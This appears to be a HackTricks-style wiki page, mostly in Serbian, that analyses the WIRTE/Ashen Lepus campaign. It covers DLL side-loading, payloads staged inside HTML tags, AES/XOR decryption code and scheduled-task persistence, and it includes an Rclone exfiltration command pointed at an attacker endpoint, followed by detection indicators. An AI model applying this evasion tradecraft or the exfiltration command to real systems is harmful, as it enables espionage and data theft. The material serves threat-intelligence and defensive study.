# Advanced DLL Side-Loading With HTML-Embedded Payload Staging

{{#include ../../../banners/hacktricks-training.md}}

## Tradecraft Overview

Ashen Lepus (aka WIRTE) iskoristio je ponovljiv obrazac koji povezuje DLL sideloading, staged HTML payloads, i modularne .NET backdoore da bi postao persistanat unutar diplomatskih mreža na Bliskom istoku. Tehnika je ponovo upotrebljiva od strane bilo kog operatora jer se oslanja na:

- **Archive-based social engineering**: bezopasni PDF-ovi upućuju ciljeve da preuzmu RAR arhivu sa sajta za deljenje fajlova. Arhiva sadrži realistično izgledajući document viewer EXE, zlonamerni DLL nazvan po pouzdanoj biblioteci (npr. `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll`), i mamac `Document.pdf`.
- **DLL search order abuse**: žrtva dvoklikne EXE, Windows rešava DLL import iz tekućeg direktorijuma, i zlonamerni loader (AshenLoader) se izvršava unutar pouzdanog procesa dok se mamac PDF otvara da bi se izbegla sumnja.
- **Living-off-the-land staging**: svaki kasniji stejdž (AshenStager → AshenOrchestrator → modules) se ne čuva na disku dok nije potreban, već se isporučuje kao enkriptovani blobovi sakriveni unutar inače bezazlenih HTML odgovora.

## Multi-Stage Side-Loading Chain

1. **Decoy EXE → AshenLoader**: EXE side-loaduje AshenLoader, koji prikuplja informacije o hostu, šifruje ga AES-CTR-om, i šalje ga POST zahvatima unutar rotirajućih parametara kao što su `token=`, `id=`, `q=`, ili `auth=` ka stazama koje podsećaju na API (npr. `/api/v2/account`).
2. **HTML extraction**: C2 otkriva sledeću fazu samo kada IP klijenta geolokuje u ciljnu regiju i `User-Agent` odgovara implantatu, otežavajući sandbox okruženja. Kada provere prođu, HTTP telo sadrži `<headerp>...</headerp>` blob sa Base64/AES-CTR šifrovanim AshenStager payload-om.
3. **Second sideload**: AshenStager se deploy-uje uz drugi legitimni binarni fajl koji uvozi `wtsapi32.dll`. Zlonamerna kopija ubrizgana u binarni fajl dohvatа više HTML-a, ovoga puta izdvajajući `<article>...</article>` kako bi povratila AshenOrchestrator.
4. **AshenOrchestrator**: modularni .NET kontroler koji dekodira Base64 JSON konfiguraciju. Polja `tg` i `au` u konfiguraciji se konkateniraju/hašuju u AES ključ, koji dešifruje `xrk`. Dobijeni bajtovi služe kao XOR ključ za svaki modul blob koji se potom preuzima.
5. **Module delivery**: svaki modul je opisan kroz HTML komentare koji preusmeravaju parser na proizvoljan tag, lomeći statička pravila koja traže samo `<headerp>` ili `<article>`. Moduli uključuju persistence (`PR*`), uninstallers (`UN*`), reconnaissance (`SN`), screen capture (`SCT`), and file exploration (`FE`).

### Šablon parsiranja HTML kontejnera
```csharp
var tag = Regex.Match(html, "<!--\s*TAG:\s*<(.*?)>\s*-->").Groups[1].Value;
var base64 = Regex.Match(html, $"<{tag}>(.*?)</{tag}>", RegexOptions.Singleline).Groups[1].Value;
var aesBytes = AesCtrDecrypt(Convert.FromBase64String(base64), key, nonce);
var module = XorBytes(aesBytes, xorKey);
LoadModule(JsonDocument.Parse(Encoding.UTF8.GetString(module)));
```
Čak i ako odbrambeni timovi blokiraju ili uklone određeni element, operateru je dovoljno da promeni tag naznačen u HTML komentaru da bi nastavio isporuku.

### Brzi alat za ekstrakciju (Python)
```python
import base64, re, requests

html = requests.get(url, headers={"User-Agent": ua}).text
tag = re.search(r"<!--\s*TAG:\s*<(.*?)>\s*-->", html, re.I).group(1)
b64 = re.search(fr"<{tag}>(.*?)</{tag}>", html, re.S | re.I).group(1)
blob = base64.b64decode(b64)
# decrypt blob with AES-CTR, then XOR if required
```
## Paralele izbegavanja otkrivanja sa HTML staging-om

Nedavno HTML smuggling istraživanje (Talos) ističe payload-ove sakrivene kao Base64 stringovi unutar `<script>` blokova u HTML prilozima i dekodirane pomoću JavaScript-a u runtime-u. Ista fora se može ponovo iskoristiti za C2 odgovore: postavite enkriptovane blob-ove unutar `<script>` taga (ili drugog DOM elementa) i dekodirajte ih u memoriji pre AES/XOR, čineći stranicu običnim HTML-om. Talos takođe prikazuje slojevitu obfuskaciju (preimenovanje identifikatora plus Base64/Caesar/AES) unutar `<script>` tagova, što mapira direktno na HTML-staged C2 blob-ove.

## Napomene o novijim varijantama (2024-2025)

- Check Point je uočio WIRTE kampanje 2024. koje su i dalje zavisile od archive-based sideloading-a, ali su koristile `propsys.dll` (stagerx64) kao prvu fazu. Stager dekodira sledeći payload pomoću Base64 + XOR (ključ `53`), šalje HTTP zahteve sa hardkodiranim `User-Agent`, i ekstrahuje enkriptovane blob-ove ugrađene između HTML tagova. U jednoj grani, faza je rekonstruisana iz duge liste ugrađenih IP stringova dekodiranih preko `RtlIpv4StringToAddressA`, a zatim konkateniranih u bajtove payload-a.
- OWN-CERT je dokumentovao ranije WIRTE alate gde side-loaded `wtsapi32.dll` dropper štiti stringove sa Base64 + TEA i koristi ime DLL-a kao ključ za dešifrovanje, zatim XOR/Base64-obfuskuje podatke o identifikaciji hosta pre slanja na C2.

## Kripto i jačanje C2

- **AES-CTR svuda**: trenutni loader-i ugrađuju 256-bitne ključeve plus nonse (npr. `{9a 20 51 98 ...}`) i opciono dodaju XOR sloj koristeći stringove poput `msasn1.dll` pre/posle dekripcije.
- **Varijacije ključnog materijala**: raniji loader-i su koristili Base64 + TEA za zaštitu ugrađenih stringova, sa dekripcioni ključem izvedenim iz malicioznog imena DLL-a (npr. `wtsapi32.dll`).
- **Podele infrastrukture + kamuflaža subdomena**: staging serveri su razdvojeni po alatima, hostovani preko različitih ASN-ova, i ponekad eksponirani preko legitimno-izgledajućih subdomena, tako da kompromitovanje jedne faze ne otkriva ostale.
- **Recon smuggling**: enumerisani podaci sada uključuju Program Files listing-e da se uoče aplikacije visokih vrednosti i uvek su enkriptovani pre napuštanja host-a.
- **URI churn**: query parametri i REST putanje se rotiraju između kampanja (`/api/v1/account?token=` → `/api/v2/account?auth=`), čime se ruše krhka pravila detekcije.
- **User-Agent pinning + safe redirects**: C2 infrastruktura odgovara samo na tačne UA stringove, a u suprotnom preusmerava na benigni news/health sajt kako bi se uklopila.
- **Gated delivery**: serveri su geo-fenced i odgovaraju samo stvarnim implantima. Neodobreni klijenti dobijaju bezopasan HTML.

## Persistencija i petlja izvršavanja

AshenStager postavlja scheduled tasks koji se lažno predstavljaju kao Windows maintenance poslovi i izvršavaju preko `svchost.exe`, npr.:

- `C:\Windows\System32\Tasks\Windows\WindowsDefenderUpdate\Windows Defender Updater`
- `C:\Windows\System32\Tasks\Windows\WindowsServicesUpdate\Windows Services Updater`
- `C:\Windows\System32\Tasks\Automatic Windows Update`

Ovi zadaci ponovo pokreću sideloading lanac pri boot-u ili u intervalima, osiguravajući da AshenOrchestrator može zahtevati sveže module bez ponovnog zapisa na disk.

## Korišćenje benignih sync klijenata za eksfiltraciju

Operatori postavljaju diplomatske dokumente u `C:\Users\Public` (svetski čitljivo i ne-sumnjivo) putem specijalizovanog modula, zatim preuzimaju legitimni [Rclone](https://rclone.org/) binarni fajl da sinhronizuju taj direktorijum sa storage-om kojim upravlja napadač. Unit42 navodi da je ovo prvi put da je ovaj akter primećen koristeći Rclone za eksfiltraciju, u skladu sa širim trendom zloupotrebe legitimnih sync alata da bi se uklopio u normalan saobraćaj:

1. Stage: copy/collect ciljane fajlove u `C:\Users\Public\{campaign}\`.
2. Configure: isporučiti Rclone config koji pokazuje na attacker-controlled HTTPS endpoint (npr. `api.technology-system[.]com`).
3. Sync: pokrenuti `rclone sync "C:\Users\Public\campaign" remote:ingest --transfers 4 --bwlimit 4M --quiet` tako da saobraćaj liči na normalne cloud backup-ove.

Pošto se Rclone široko koristi za legitimne backup tokove, branitelji se moraju fokusirati na anomalne izvršavanja (novi binarni fajlovi, neobični remoti, ili nagla sinhronizacija `C:\Users\Public`).

## Indikatori za detekciju

- Alertovati na **signed processes** koji neočekivano učitavaju DLL-ove iz user-writable putanja (Procmon filters + `Get-ProcessMitigation -Module`), posebno kada imena DLL-ova preklapaju sa `netutils`, `srvcli`, `dwampi`, ili `wtsapi32`.
- Inspektovati sumnjive HTTPS odgovore na **velike Base64 blob-ove ugrađene unutar neobičnih tagova** ili zaštićene `<!-- TAG: <xyz> -->` komentarima.
- Proširiti HTML detekciju na **Base64 stringove unutar `<script>` blokova** (HTML smuggling-style staging) koji se dekodiraju preko JavaScript-a pre AES/XOR obrade.
- Tražiti **scheduled tasks** koji pokreću `svchost.exe` sa ne-servis argumentima ili koji upućuju nazad na direktorijume dropper-a.
- Pratiti **C2 redirect-ove** koji vraćaju payload samo za tačne `User-Agent` stringove, a u suprotnom preusmeravaju na legitimne news/health domene.
- Monitorisati pojavljivanje **Rclone** binarija van IT-managed lokacija, nove `rclone.conf` fajlove, ili sync poslove koji povlače iz staging direktorijuma poput `C:\Users\Public`.

## References

- [Hamas-Affiliated Ashen Lepus Targets Middle Eastern Diplomatic Entities With New AshTag Malware Suite](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/)
- [Hidden between the tags: Insights into evasion techniques in HTML smuggling](https://blog.talosintelligence.com/hidden-between-the-tags-insights-into-evasion-techniques-in-html-smuggling/)
- [Hamas-affiliated Threat Actor WIRTE Continues its Middle East Operations and Moves to Disruptive Activity](https://research.checkpoint.com/2024/hamas-affiliated-threat-actor-expands-to-disruptive-activity/)
- [WIRTE: In Search of Lost Time](https://www.own.security/en/ressources/blog/wirte-analyse-campagne-cyber-own-cert)

{{#include ../../../banners/hacktricks-training.md}}
